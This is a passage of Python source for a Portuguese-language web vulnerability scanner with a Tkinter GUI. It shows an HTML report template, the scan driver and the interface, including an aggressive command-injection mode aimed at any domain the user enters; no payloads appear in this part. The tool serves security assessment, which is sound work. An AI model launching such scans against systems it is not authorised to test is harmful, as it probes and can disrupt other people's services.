        .severity-count {{
            margin-left: auto;
            font-size: 14px;
            color: var(--text-secondary);
            font-weight: 600;
            background: white;
            padding: 4px 12px;
            border-radius: 20px;
        }}

        .vuln-card {{
            background: var(--bg-primary);
            border: 1px solid var(--border);
            border-left: 4px solid var(--severity-color);
            margin-bottom: 20px;
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s ease;
        }}

        .vuln-card:hover {{
            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
            transform: translateX(4px);
        }}

        .vuln-card.CRITICAL {{ --severity-color: var(--critical); }}
        .vuln-card.HIGH {{ --severity-color: var(--high); }}
        .vuln-card.MEDIUM {{ --severity-color: var(--medium); }}
        .vuln-card.LOW {{ --severity-color: var(--low); }}

        .vuln-header {{
            padding: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, var(--bg-secondary), var(--bg-primary));
            border-bottom: 1px solid var(--border);
        }}

        .vuln-type {{
            font-size: 18px;
            font-weight: 600;
            color: var(--text-primary);
        }}

        .severity-badge {{
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            background: var(--severity-color);
            color: white;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
        }}

        .vuln-body {{ padding: 24px; }}

        .vuln-detail {{
            margin-bottom: 20px;
            padding: 16px;
            background: var(--bg-secondary);
            border-radius: 6px;
            border-left: 3px solid var(--border);
        }}

        .vuln-detail:last-child {{ margin-bottom: 0; }}

        .detail-label {{
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            font-weight: 700;
            margin-bottom: 8px;
        }}

        .detail-content {{
            font-size: 14px;
            color: var(--text-primary);
            line-height: 1.6;
        }}

        code {{
            background: #1e293b;
            color: #e2e8f0;
            padding: 4px 10px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            border: 1px solid #334155;
            word-break: break-all;
            display: inline-block;
            margin: 2px 0;
        }}

        .code-block {{
            background: #1e293b;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            overflow-x: auto;
            margin: 12px 0;
            border: 1px solid #334155;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
        }}

        .status-success {{
            padding: 48px;
            text-align: center;
            background: linear-gradient(135deg, #d1fae5, #a7f3d0);
            border: 2px solid var(--success);
            border-radius: 12px;
            color: #065f46;
            animation: successPulse 2s ease-in-out infinite;
        }}

        @keyframes successPulse {{
            0%, 100% {{ transform: scale(1); }}
            50% {{ transform: scale(1.02); }}
        }}

        .status-success::before {{
            content: "✓";
            display: block;
            font-size: 64px;
            margin-bottom: 20px;
            color: var(--success);
            animation: checkmark 0.6s ease-out;
        }}

        @keyframes checkmark {{
            from {{ transform: scale(0) rotate(-45deg); opacity: 0; }}
            to {{ transform: scale(1) rotate(0deg); opacity: 1; }}
        }}

        .footer {{
            background: linear-gradient(135deg, #1e293b, #0f172a);
            color: white;
            padding: 40px 60px;
            font-size: 13px;
        }}

        .footer-content {{
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}

        .footer-brand {{
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            font-size: 16px;
            background: linear-gradient(90deg, #60a5fa, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}

        .footer-meta {{
            opacity: 0.7;
            font-family: 'JetBrains Mono', monospace;
        }}

        @media print {{
            body {{ background: white; padding: 0; }}
            .container {{ box-shadow: none; max-width: 100%; border-radius: 0; }}
            .vuln-card {{ page-break-inside: avoid; }}
            .metric:hover {{ transform: none; box-shadow: none; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-content">
                <div class="header-top">
                    <div class="logo">🦅 WebVuln Scanner — Scanner de Segurança Web</div>
                    <div class="scan-id">SCAN-{hashlib.md5(f'{self.domain}{datetime.now()}'.encode()).hexdigest()[:8].upper()}</div>
                </div>
                <h1>Security Assessment Report</h1>
                <div class="target-info">{html.escape(str(self.domain))}</div>
                <div class="meta-info">
                    {datetime.now().strftime('%d/%m/%Y %H:%M:%S UTC')} ·
                    Mode: {'AGGRESSIVE' if self.aggressive else 'STANDARD'}
                </div>
            </div>
        </div>

        <div class="executive-summary">
            <div class="summary-title">Executive Summary</div>
            <div class="metrics-grid">
                <div class="metric info">
                    <div class="metric-value">{len(self.discovered_endpoints)}</div>
                    <div class="metric-label">Endpoints</div>
                </div>
                <div class="metric {'critical' if len(self.vulnerabilities) > 0 else 'success'}">
                    <div class="metric-value">{len(self.vulnerabilities)}</div>
                    <div class="metric-label">Vulnerabilities</div>
                </div>
                <div class="metric critical">
                    <div class="metric-value">{len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL'])}</div>
                    <div class="metric-label">Critical</div>
                </div>
                <div class="metric high">
                    <div class="metric-value">{len([v for v in self.vulnerabilities if v['severity'] == 'HIGH'])}</div>
                    <div class="metric-label">High</div>
                </div>
                <div class="metric medium">
                    <div class="metric-value">{len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM'])}</div>
                    <div class="metric-label">Medium</div>
                </div>
                <div class="metric info">
                    <div class="metric-value">{len(self.headers_issues)}</div>
                    <div class="metric-label">Header Issues</div>
                </div>
            </div>
        </div>

        <div class="section">
            <div class="section-header">
                <div class="section-title">📍 Discovered Endpoints</div>
                <div class="section-subtitle">All accessible endpoints found during reconnaissance</div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>URL</th>
                        <th>Status</th>
                        <th>Size</th>
                        <th>Server</th>
                    </tr>
                </thead>
                <tbody>
"""
        for ep in self.discovered_endpoints:
            html_content += f"""
                    <tr>
                        <td><code>{html.escape(str(ep.get('url', '')))}</code></td>
                        <td>{html.escape(str(ep.get('status', '')))}</td>
                        <td>{html.escape(str(ep.get('length', 'N/A')))} bytes</td>
                        <td>{html.escape(str(ep.get('server', 'Unknown')))}</td>
                    </tr>
"""
        html_content += """
                </tbody>
            </table>
        </div>

        <div class="section">
            <div class="section-header">
                <div class="section-title">🚨 Vulnerabilities Found</div>
                <div class="section-subtitle">Security issues discovered during testing</div>
            </div>
"""
        if self.vulnerabilities:
            for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                vulns = [v for v in self.vulnerabilities if v['severity'] == severity]
                if vulns:
                    html_content += f"""
            <div class="severity-group">
                <div class="severity-header" style="--severity-color: var(--{severity.lower()});">
                    <div class="severity-indicator"></div>
                    <div class="severity-title">{severity} Severity</div>
                    <div class="severity-count">{len(vulns)} issue{'s' if len(vulns) > 1 else ''}</div>
                </div>
"""
                    for vuln in vulns:
                        html_content += f"""
                <div class="vuln-card {vuln['severity']}">
                    <div class="vuln-header">
                        <div class="vuln-type">{html.escape(str(vuln.get('type', '')))}</div>
                        <span class="severity-badge">{html.escape(str(vuln.get('severity', '')))}</span>
                    </div>
                    <div class="vuln-body">
                        <div class="vuln-detail">
                            <div class="detail-label">URL</div>
                            <div class="detail-content"><code>{html.escape(str(vuln.get('url', '')))}</code></div>
                        </div>
                        <div class="vuln-detail">
                            <div class="detail-label">Parameter</div>
                            <div class="detail-content"><code>{html.escape(str(vuln.get('parameter', '')))}</code></div>
                        </div>
                        <div class="vuln-detail">
                            <div class="detail-label">Payload</div>
                            <div class="detail-content"><code>{html.escape(str(vuln.get('payload', '')))}</code></div>
                        </div>
                        <div class="vuln-detail">
                            <div class="detail-label">Evidence</div>
                            <div class="detail-content">{html.escape(str(vuln.get('evidence', '')))}</div>
                        </div>
                    </div>
                </div>
"""
                    html_content += """
            </div>
"""
        else:
            html_content += """
            <div class="status-success">
                <h2>No vulnerabilities detected!</h2>
                <p style="margin-top: 12px;">The scanned endpoints appear to be secure against the tested attack vectors.</p>
            </div>
"""
        html_content += """
        </div>
"""
        if self.headers_issues:
            html_content += """
        <div class="section">
            <div class="section-header">
                <div class="section-title">🛡️ Missing Security Headers</div>
                <div class="section-subtitle">HTTP security headers that should be implemented</div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Header</th>
                        <th>Impact</th>
                    </tr>
                </thead>
                <tbody>
"""
            for issue in self.headers_issues[:10]:
                html_content += f"""
                    <tr>
                        <td><code>{html.escape(str(issue.get('missing_header', '')))}</code></td>
                        <td>{html.escape(str(issue.get('impact', '')))}</td>
                    </tr>
"""
            html_content += """
                </tbody>
            </table>
        </div>
"""
        html_content += f"""
        <div class="footer">
            <div class="footer-content">
                <div class="footer-brand">🦅 WebVuln Scanner — Scanner de Segurança Web</div>
                <div class="footer-meta">Generated: {datetime.now().strftime('%d/%m/%Y %H:%M:%S UTC')}</div>
            </div>
        </div>
    </div>
</body>
</html>
"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        self.log(f'[✓] Relatório HTML: {output_file}', 'success')

    # ------------------------------------------------------- scan principal
    def scan(self) -> dict:
        """Executa o scan completo. Retorna resumo (duração, endpoints)."""
        start_time = time.time()
        self.log(f'[*] Alvo: {self.domain} | Threads: {self.threads} | '
                 f'Timeout: {self.timeout}s | Modo: {"AGGRESSIVO" if self.aggressive else "NORMAL"}', 'info')

        endpoints = self.discover_endpoints()
        self.log(f'\n[*] Descoberta concluída: {len(endpoints)} endpoints encontrados',
                 'warn' if not endpoints else 'success')

        if not endpoints or self.stop_event.is_set():
            self.log('[!] Nenhum endpoint descoberto ou scan cancelado. Encerrando.', 'warn')
            return {'duration': time.time() - start_time, 'endpoints': len(endpoints)}

        self.run_security_tests(endpoints)
        duration = time.time() - start_time
        self.log(f'[*] Duração total do scan: {duration:.2f}s', 'info')
        return {'duration': duration, 'endpoints': len(endpoints)}


# =============================================================================
# 2) INTERFACE GRÁFICA (Tkinter)
# =============================================================================

class WebVulnScanner:
    """Interface gráfica do WebVuln Scanner."""

    def __init__(self, root):
        self.root = root
        self.root.title("🦅 WebVuln Scanner — Scanner de Segurança Web")
        self.root.minsize(950, 620)

        # Maximizar conforme o sistema operacional
        sistema = platform.system()

        if sistema == "Windows":
            self.root.state("zoomed")
        elif sistema == "Linux":
            try:
                self.root.attributes("-zoomed", True)
            except tk.TclError:
                largura = self.root.winfo_screenwidth()
                altura = self.root.winfo_screenheight()
                self.root.geometry(f"{largura}x{altura}+0+0")
        else:
            self.root.geometry("1100x720")

        self.msg_queue = queue.Queue()
        self.scan_thread = None
        self.scanner = None
        self.stop_event = threading.Event()
        self.scan_running = False

        self._build_layout()
        self.root.after(100, self._process_queue)

    # ------------------------------------------------------------- layout
    def _build_layout(self):
        # Cabeçalho
        header = tk.Frame(self.root, bg='#1e293b')
        header.pack(fill='x')
        tk.Label(header, text='🦅 WebVuln Scanner — Scanner de Segurança Web',
                 bg='#1e293b', fg='white', font=('Segoe UI', 13, 'bold')).pack(side='left', padx=14, pady=10)
        self.scan_id_label = tk.Label(header, text='', bg='#1e293b', fg='#94a3b8',
                                      font=('Consolas', 9))
        self.scan_id_label.pack(side='right', padx=14)

        # Controles - linha 1
        controls = ttk.LabelFrame(self.root, text=' Configurações do Scan ', padding=10)
        controls.pack(fill='x', padx=10, pady=(10, 0))

        row1 = ttk.Frame(controls)
        row1.pack(fill='x', pady=2)
        ttk.Label(row1, text='Alvo (domínio/URL):').pack(side='left')
        self.target_var = tk.StringVar()
        self.target_entry = ttk.Entry(row1, textvariable=self.target_var, width=42)
        self.target_entry.pack(side='left', padx=8)
        self.target_entry.bind('<Return>', lambda e: self.start_scan())

        ttk.Label(row1, text='Timeouts:').pack(side='left', padx=(18, 2))
        self.timeout_var = tk.IntVar(value=10)
        ttk.Spinbox(row1, from_=1, to=60, textvariable=self.timeout_var, width=4).pack(side='left')

        ttk.Label(row1, text='Threads:').pack(side='left', padx=(18, 2))
        self.threads_var = tk.IntVar(value=5)
        ttk.Spinbox(row1, from_=1, to=50, textvariable=self.threads_var, width=4).pack(side='left')

        self.aggressive_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(row1, text='Modo Agressivo (cmd injection)', variable=self.aggressive_var).pack(side='left', padx=18)

        # Controles - linha 2
        row2 = ttk.Frame(controls)
        row2.pack(fill='x', pady=(8, 2))
        ttk.Label(row2, text='Pasta de Salvar Arquivo:').pack(side='left')
        self.outdir_var = tk.StringVar(value='.')
        ttk.Entry(row2, textvariable=self.outdir_var, width=38).pack(side='left', padx=8)
        ttk.Button(row2, text='...', width=3, command=self.choose_output_dir).pack(side='left')

        self.btn_clear = ttk.Button(row2, text='Limpar Console', command=self.clear_console)
        self.btn_clear.pack(side='right', padx=(8, 0))
        self.btn_report = ttk.Button(row2, text='Gerar Relatórios', command=self.generate_reports, state='disabled')
        self.btn_report.pack(side='right', padx=8)
        self.btn_cancel = ttk.Button(row2, text='■ Cancelar', command=self.cancel_scan, state='disabled')
        self.btn_cancel.pack(side='right', padx=8)
        self.btn_scan = ttk.Button(row2, text='▶ Iniciar Scan', command=self.start_scan)
        self.btn_scan.pack(side='right', padx=8)

        # Estatísticas
        stats = ttk.LabelFrame(self.root, text=' Estatísticas ', padding=8)
        stats.pack(fill='x', padx=10, pady=(10, 0))
        self.stats_vars = {}
        for key, label in [('endpoints', 'Endpoints'), ('vulns', 'Vulnerabilidades'),
                           ('critical', 'Críticas'), ('high', 'Altas'),
                           ('medium', 'Médias'), ('headers', 'Headers')]:
            cell = ttk.Frame(stats)
            cell.pack(side='left', expand=True, fill='x')
            var = tk.StringVar(value='0')
            ttk.Label(cell, textvariable=var, font=('Segoe UI', 15, 'bold')).pack()
            ttk.Label(cell, text=label, font=('Segoe UI', 8)).pack()
            self.stats_vars[key] = var

        # Abas
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=(10, 5))

        # --- Aba Console
        console_frame = ttk.Frame(self.notebook)
        self.console = tk.Text(console_frame, bg='#0b1120', fg='#e2e8f0',
                               font=('Consolas', 10), wrap='word',
                               state='disabled', insertbackground='white')
        self.console.pack(fill='both', expand=True)
        self.console.tag_configure('info', foreground='#00d4ff')
        self.console.tag_configure('success', foreground='#00ff88')
        self.console.tag_configure('warn', foreground='#ffcc00')
        self.console.tag_configure('vuln', foreground='#ff4444', font=('Consolas', 10, 'bold'))
        self.console.tag_configure('error', foreground='#ff5555', font=('Consolas', 10, 'bold'))
        self.console.tag_configure('header', foreground='#c084fc', font=('Consolas', 10, 'bold'))
        self.console.tag_configure('system', foreground='#ffffff', font=('Consolas', 10, 'bold'))
        self.notebook.add(console_frame, text='  Console  ')

       
        # --- Aba Endpoints
        endpoints_frame = ttk.Frame(self.notebook)

        # Treeview
        self.endpoints_tree = ttk.Treeview(
            endpoints_frame,
            columns=("url", "status", "length", "server"),
            show="headings",
            selectmode="browse"
        )

        # Cabeçalhos
        self.endpoints_tree.heading("url", text="URL", anchor="w")
        self.endpoints_tree.heading("status", text="Status", anchor="w")
        self.endpoints_tree.heading("length", text="Tamanho", anchor="w")
        self.endpoints_tree.heading("server", text="Servidor", anchor="w")

        # Colunas
        self.endpoints_tree.column(
            "url",
            width=500,
            minwidth=500,
            anchor="w",
            stretch=True
        )

        self.endpoints_tree.column(
            "status",
            width=90,
            minwidth=90,
            anchor="w",
            stretch=False
        )

        self.endpoints_tree.column(
            "length",
            width=120,
            minwidth=120,
            anchor="w",
            stretch=False
        )

        self.endpoints_tree.column(
            "server",
            width=280,
            minwidth=220,
            anchor="w",
            stretch=True
        )

        # Scrollbars
        scroll_y = ttk.Scrollbar(
            endpoints_frame,
            orient="vertical",
            command=self.endpoints_tree.yview
        )

        scroll_x = ttk.Scrollbar(
            endpoints_frame,
            orient="horizontal",
            command=self.endpoints_tree.xview
        )

        self.endpoints_tree.configure(
            yscrollcommand=scroll_y.set,
            xscrollcommand=scroll_x.set
        )

        # Layout
        self.endpoints_tree.grid(row=0, column=0, sticky="nsew")
        scroll_y.grid(row=0, column=1, sticky="ns")
        scroll_x.grid(row=1, column=0, sticky="ew")

        endpoints_frame.grid_rowconfigure(0, weight=1)
        endpoints_frame.grid_columnconfigure(0, weight=1)

        # Adiciona ao Notebook
        self.notebook.add(endpoints_frame, text="  Endpoints  ")

        # --- Aba Vulnerabilidades
        vuln_frame = ttk.Frame(self.notebook)
        self.vuln_tree = ttk.Treeview(vuln_frame,
                                      columns=('severity', 'type', 'url', 'parameter', 'payload'),
                                      show='headings')
        self._setup_tree(self.vuln_tree,
                         [('severity', 'Severidade', 90), ('type', 'Tipo', 200),
                          ('url', 'URL', 300), ('parameter', 'Parâmetro', 120),
                          ('payload', 'Payload', 230)])
        self.vuln_tree.tag_configure('CRITICAL', foreground='#b91c1c', background='#fee2e2')
        self.vuln_tree.tag_configure('HIGH', foreground='#c2410c', background='#ffedd5')
        self.vuln_tree.tag_configure('MEDIUM', foreground='#b45309', background='#fef3c7')
        self.vuln_tree.tag_configure('LOW', foreground='#15803d', background='#dcfce7')
        self.notebook.add(vuln_frame, text='  Vulnerabilidades  ')

        # --- Aba Headers
        headers_frame = ttk.Frame(self.notebook)
        self.headers_tree = ttk.Treeview(headers_frame, columns=('header', 'impact'), show='headings')
        self._setup_tree(self.headers_tree,
                         [('header', 'Cabeçalho Ausente', 260), ('impact', 'Impacto', 460)])
        self.notebook.add(headers_frame, text='  Headers de Segurança  ')

        # Barra de status
        self.status_var = tk.StringVar(value='Pronto.')
        ttk.Label(self.root, textvariable=self.status_var, relief='sunken', anchor='w').pack(fill='x', side='bottom')

    def _setup_tree(self, tree, columns):
        """Configura colunas e scrollbars de uma Treeview."""
        for col, title, width in columns:
            tree.heading(col, text=title)
            tree.column(col, width=width, anchor='w', stretch=(col == columns[0][0]))
        vsb = ttk.Scrollbar(tree.master, orient='vertical', command=tree.yview)
        hsb = ttk.Scrollbar(tree.master, orient='horizontal', command=tree.xview)
        tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        vsb.pack(side='right', fill='y')
        hsb.pack(side='bottom', fill='x')
        tree.pack(fill='both', expand=True)

    # ------------------------------------------------------------- fila de mensagens
    def log(self, message, level='info'):
        """Thread-safe: enfileira mensagem para a GUI."""
        self.msg_queue.put(('log', message, level))

    def _console_write(self, message, level='info'):
        self.console.config(state='normal')
        self.console.insert(tk.END, message + '\n', level)
        self.console.see(tk.END)
        self.console.config(state='disabled')

    def _process_queue(self):
        try:
            while True:
                item = self.msg_queue.get_nowait()
                if item[0] == 'log':
                    self._console_write(item[1], item[2])
                elif item[0] == 'done':
                    self._finish_scan(item[1])
                elif item[0] == 'error':
                    self._console_write(f'[ERRO] {item[1]}', 'error')
                    self._reset_ui_after_scan()
        except queue.Empty:
            pass
        self.root.after(100, self._process_queue)

    # ------------------------------------------------------------- ações
    def start_scan(self):
        target = self.target_var.get().strip()
        if not target:
            messagebox.showwarning('Alvo ausente', 'Informe um domínio ou URL para o scan.')
            return
        try:
            timeout = int(self.timeout_var.get())
            threads = int(self.threads_var.get())
        except ValueError:
            messagebox.showwarning('Valor inválido', 'Timeout e Threads devem ser números inteiros.')
            return
        if timeout < 1 or threads < 1:
            messagebox.showwarning('Valor inválido', 'Timeout e Threads devem ser >= 1.')
            return

        # Reset de estado
        self.stop_event.clear()
        self.scan_running = True
        self.btn_scan.config(state='disabled')
        self.btn_cancel.config(state='normal')
        self.btn_report.config(state='disabled')
        for tree in (self.endpoints_tree, self.vuln_tree, self.headers_tree):
            tree.delete(*tree.get_children())
        for var in self.stats_vars.values():
            var.set('0')

        scan_id = hashlib.md5(f'{target}{datetime.now()}'.encode()).hexdigest()[:8].upper()
        self.scan_id_label.config(text=f'SCAN-{scan_id}')
        self.status_var.set('Scan em andamento...')

        self.scanner = WebVulnEngine(
            target,
            timeout=timeout,
            threads=threads,
            aggressive=self.aggressive_var.get(),
            log_callback=self.log,
            stop_event=self.stop_event,
        )
        self.log(f'[SISTEMA] Iniciando scan {scan_id} → {self.scanner.domain}', 'system')

        self.scan_thread = threading.Thread(target=self._scan_worker, daemon=True)
        self.scan_thread.start()

    def _scan_worker(self):
        try:
            summary = self.scanner.scan()
            self.msg_queue.put(('done', summary))
        except Exception as e:
            self.msg_queue.put(('error', str(e)))

    def cancel_scan(self):
        if self.scan_running:
            self.stop_event.set()
            self.status_var.set('Cancelando scan... (aguardando tarefas atuais)')
            self.log('[SISTEMA] Cancelamento solicitado pelo usuário...', 'warn')

    def _finish_scan(self, summary):
        self.scan_running = False
        self.btn_scan.config(state='normal')
        self.btn_cancel.config(state='disabled')

        s = self.scanner
        if not s:
            return

        # Endpoints
        for ep in s.discovered_endpoints:
            self.endpoints_tree.insert('', tk.END, values=(
                ep['url'], ep['status'], ep['length'], ep.get('server', 'Unknown')))

        # Vulnerabilidades
        for v in s.vulnerabilities:
            self.vuln_tree.insert('', tk.END, values=(
                v['severity'], v['type'], v['url'], v['parameter'], v['payload']),
                tags=(v['severity'],))

        # Headers
        for h in s.headers_issues:
            self.headers_tree.insert('', tk.END, values=(h['missing_header'], h['impact']))

        # Estatísticas
        self.stats_vars['endpoints'].set(str(len(s.discovered_endpoints)))
        self.stats_vars['vulns'].set(str(len(s.vulnerabilities)))
        self.stats_vars['critical'].set(str(len([v for v in s.vulnerabilities if v['severity'] == 'CRITICAL'])))
        self.stats_vars['high'].set(str(len([v for v in s.vulnerabilities if v['severity'] == 'HIGH'])))
        self.stats_vars['medium'].set(str(len([v for v in s.vulnerabilities if v['severity'] == 'MEDIUM'])))
        self.stats_vars['headers'].set(str(len(s.headers_issues)))

        duration = summary.get('duration', 0) if summary else 0
        self.log('', 'system')
        self.log('=' * 62, 'system')
        if self.stop_event.is_set():
            self.log('SCAN CANCELADO PELO USUÁRIO', 'warn')
        else:
            self.log('SCAN CONCLUÍDO', 'system')
        self.log(f'Duração: {duration:.2f}s | Endpoints: {len(s.discovered_endpoints)} | '
                 f'Vulnerabilidades: {len(s.vulnerabilities)} | Headers ausentes: {len(s.headers_issues)}', 'system')
        self.log('=' * 62, 'system')

        self.btn_report.config(state='normal' if s.discovered_endpoints else 'disabled')
        self.status_var.set(f'Scan concluído em {duration:.2f}s.')

    def _reset_ui_after_scan(self):
        self.scan_running = False
        self.btn_scan.config(state='normal')
        self.btn_cancel.config(state='disabled')
        self.status_var.set('Pronto.')

    def choose_output_dir(self):
        d = filedialog.askdirectory(title='Selecionar pasta de saída')
        if d:
            self.outdir_var.set(d)

    def generate_reports(self):
        if not self.scanner:
            return
        outdir = self.outdir_var.get().strip() or '.'
        Path(outdir).mkdir(parents=True, exist_ok=True)
        domain_name = urlparse(self.scanner.domain).netloc.replace(':', '_').replace('.', '_')
        try:
            json_file = self.scanner.get_unique_filename(outdir, f'WebVuln_report_{domain_name}', 'json')
            self.scanner.generate_json_report(json_file)
            html_file = self.scanner.get_unique_filename(outdir, f'WebVuln_report_{domain_name}', 'html')
            self.scanner.generate_html_report(html_file)
            self.log(f'[SISTEMA] Relatórios salvos em: {outdir}', 'success')
            messagebox.showinfo('Relatórios gerados', f'JSON: {json_file}\n\nHTML: {html_file}')
        except Exception as e:
            messagebox.showerror('Erro', f'Falha ao gerar relatórios: {e}')

    def clear_console(self):
        self.console.config(state='normal')
        self.console.delete('1.0', tk.END)
        self.console.config(state='disabled')

    def on_close(self):
        if self.scan_running:
            if not messagebox.askyesno('Scan em andamento',
                                       'O scan ainda está rodando. Deseja cancelar e sair?'):
                return
            self.stop_event.set()
        self.root.destroy()

# =============================================================================
# 3) MAIN
# =============================================================================

def main():
    root = tk.Tk()
    app = WebVulnScanner(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()

if __name__ == '__main__':
    main()
